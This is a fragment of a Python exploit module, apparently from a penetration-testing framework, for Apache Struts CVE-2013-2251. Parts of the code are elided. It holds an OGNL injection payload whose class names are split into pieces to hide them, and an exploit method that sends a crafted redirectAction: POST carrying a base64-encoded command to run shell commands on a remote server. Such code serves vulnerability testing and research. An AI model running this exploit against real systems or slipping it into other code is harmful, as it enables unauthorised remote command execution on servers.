...
class Module:
    def __init__(self,Main):
        ...
        self.info={
            ...
            'Author':'sushan',
            'Description':'Apache Struts 2.0.0 through 2.3.15 allows remote attackers to execute arbitrary OGNL expressions via a parameter with a crafted (1)action:,(2)redirect:,(3)redirectAction: prefix',
            'Comments':'http://www.cvedetails.com/cve/CVE-2013-2251'
        }
        self.options={
            'RHOST':{
...
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].getWriter().close())\
'''
        xx=req.post({'Content-Type':'application/x-www-form-urlencoded'},'pic=1&redirectAction:'+quote('%{'+a+'}'))
        try:
    ...
    def exploit(self,cmd):
        req=http.Http(self.options)
        xx=req.post({'Content-Type':'application/x-www-form-urlencoded','x-ids':base64.b64encode(cmd)},'pic=1&redirectAction:'+quote(self.payload(cmd)))
